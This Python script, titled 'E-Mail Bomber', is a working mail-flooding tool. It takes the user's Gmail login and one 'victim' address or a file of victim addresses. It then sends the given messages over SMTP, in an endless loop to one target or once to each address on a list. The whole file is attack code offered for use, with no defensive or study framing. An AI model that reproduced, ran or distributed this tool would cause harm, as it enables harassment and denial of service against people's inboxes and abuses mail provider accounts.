#!/usr/bin/python
import smtplib
import sys
import os
import time
import getpass

#Colors in Python
GREEN = '\033[32m'
LIGHTCYAN = "\033[96m"
RED = '\033[91m'
YELLOW = '\33[93m'

os.system("clear || cls")
def banner(): 
  sys.stdout.write(YELLOW+"""
▓█████        ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  
▓█   ▀       ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒███         ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
▒▓█  ▄       ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░▒████▒      ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░░ ▒░ ░      ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ░  ░      ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
   ░         ░      ░     ░   ▒    ▒ ░  ░ ░       ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ 
   ░  ░             ░         ░  ░ ░      ░  ░    ░          ░ ░         ░    ░         ░  ░   ░     
                                                       ░                           ░                 
""")
  print()
  print('         '+LIGHTCYAN+'CREATED BY HUZEFA'+'          ')
  print()

def Input():
  global email
  global paswd
  global vmail
  global message
  global message2
  email = input(YELLOW+'[?]'+' '+GREEN+'Enter you Email Address : '+RED)
  paswd = getpass.getpass(YELLOW+'[?]'+' '+GREEN+'Enter your Password : '+RED)
  message = input(YELLOW+'[?]'+' '+GREEN+'Enter a message to send to victim : '+RED)
  message2 = input(YELLOW+'[?]'+' '+GREEN+'Enter Different Message : '+RED)
  #message3 = input(YELLOW+'[?]'+' '+GREEN+'Enter Different Message : '+RED)
  vmail = input(YELLOW+'[?]'+' '+GREEN+'Enter Victims Email : '+RED)
  #vmail2 = input(YELLOW+'[?]'+' '+GREEN+'Enter Another Victims Address : '+RED)

print()
banner()
print(YELLOW+'[1]'+' '+GREEN+'Start E-Mail Bomber [Bomb a Single E-Mail Address]')
print(YELLOW+'[2]'+' '+GREEN+'Start E-Mail Bomber [Bomb Multiple E-Mails (SINGLE MAIL)]')
print()
choice = input(YELLOW+'[!]'+' '+GREEN+'Choose an Option : '+LIGHTCYAN)

print()
def User():
  global email
  global paswd
  global vmaillst
  global message
  email = input(YELLOW+'[?]'+' '+GREEN+'Enter Email Address : '+RED)
  paswd = getpass.getpass(YELLOW+'[?]'+' '+GREEN+'Enter your Password : '+RED)
  vmaillst = input(YELLOW+'[?]'+' '+GREEN+'Enter the file Path [Contains list of Victims E-Mails : '+RED)
  message = input(YELLOW+'[?]'+' '+GREEN+'Enter Your Message : '+RED)
  print()
  vmaillst = open(vmaillst, "r")
  server = smtplib.SMTP('smtp.gmail.com',587)
  server.ehlo()
  server.starttls()
  server.login(email,paswd)
  print()
  print(LIGHTCYAN+'[…]'+' '+YELLOW+'Sending is in Progress……')
  print()
  print(YELLOW+'[!!!]'+' '+YELLOW+'Press Control+C to Exit this Process!!!')
  print()
  for mails in vmaillst:
   server.sendmail(email,mails,message)  
   print(LIGHTCYAN+'[√]'+' '+GREEN+'All Mails sent Succesfully')
   print('----------------------------------')

if choice == '1':
   os.system('clear || cls')
   time.sleep(1)
   banner()
   Input()
elif choice == '2':
   os.system('clear || cls')
   time.sleep(1)
   banner()
   User()
elif choice == '3':
   time.sleep(1)
   sys.exit(1)

server = smtplib.SMTP('smtp.gmail.com',587)
server.ehlo()
server.starttls()
server.login(email,paswd)
print()
print(LIGHTCYAN+'[…]'+' '+YELLOW+'Sending is in Progress……')
print()
print(YELLOW+'[!!!]'+' '+YELLOW+'Press Control+C to exit this Process!!!!')
print()
while True:
    try:
      server.sendmail(email,vmail,message2)
      server.sendmail(email,vmail,message)
      #server.sendmail(email,vmail,message3)
      print(LIGHTCYAN+'[√]'+' '+GREEN+'Sent Successfully to ' + vmail.upper())
      #server.sendmail(email,vmail2,message)
      #print(YELLOW+'[√]'+' '+GREEN+'Sent Successfully to ' + vmail2.upper())
      print('--------------------------------------------------')
    except KeyboardInterrupt:
      print()
      time.sleep(2)
      sys.exit()
